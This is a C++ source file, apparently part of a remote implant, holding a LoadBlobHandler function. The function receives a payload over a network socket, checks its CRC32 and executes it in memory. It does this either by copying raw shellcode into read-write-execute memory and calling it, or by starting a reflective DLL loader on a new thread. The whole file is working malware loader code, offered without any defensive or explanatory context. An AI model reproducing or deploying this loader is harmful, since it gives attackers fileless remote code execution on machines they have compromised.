#include "stdafx.h"
#include "LoadBlobHandler.h"
#include "crc32.hpp"


unsigned long __stdcall ReflectThread(void * params)
{
	return ReflectiveLoader((char *)params);
}

void LoadBlobHandler()
{
	BLOB_PACKET packet;
	int bytesRead = recv(g_Info.conn, (char *) &packet, sizeof(BLOB_PACKET), MSG_WAITALL);
	InfoLog(L"Received LoadBlob request");

	if (bytesRead != sizeof(BLOB_PACKET))
	{
		InfoLog(L"Load Blob: Bytes Read [%x] != sizeof(BLOB_PACKET) [%x]", bytesRead, sizeof(BLOB_PACKET));
		return;
	}

	if (packet.payloadLen > g_Info.Settings.uMaxPayloadSize)
	{
		InfoLog(L"Received payload size [0x%x] greater than acceptable bounds [0x%x]", packet.payloadLen, g_Info.Settings.uMaxPayloadSize);
		return;
	}

	char * payload = (char *)malloc(packet.payloadLen);
	bytesRead = recv(g_Info.conn, payload, packet.payloadLen, MSG_WAITALL);
	UINT checksum = crc32(1, payload, packet.payloadLen);
	if (checksum != packet.checksum)
	{
		ErrorLog(L"Payload checksum [0x%x] didn't match checksum sent in packet [0x%x]", checksum, packet.checksum);
		return;
	}

	switch (packet.loadType)
	{
			case LOAD_TYPE::PIC:
			{
				typedef void(*pCall)();
				
				pCall call = (pCall)VirtualAlloc(NULL, packet.payloadLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
				if (!call)
				{
					ErrorLog(L"Failed to allocate executable memory for payload, error code [0x%x]", GetLastError());
					return;
				}
				memcpy(call, payload, packet.payloadLen);
				free(payload);
				call();
				break;
			}
			case LOAD_TYPE::REFLECTIVE:
			{
				CreateThread(NULL, NULL, ReflectThread, payload, NULL, NULL);
				break;
			}
			default:
			{
				ErrorLog(L"Invalid load type: [0x%x]", packet.loadType);
				break;
			}
	}
}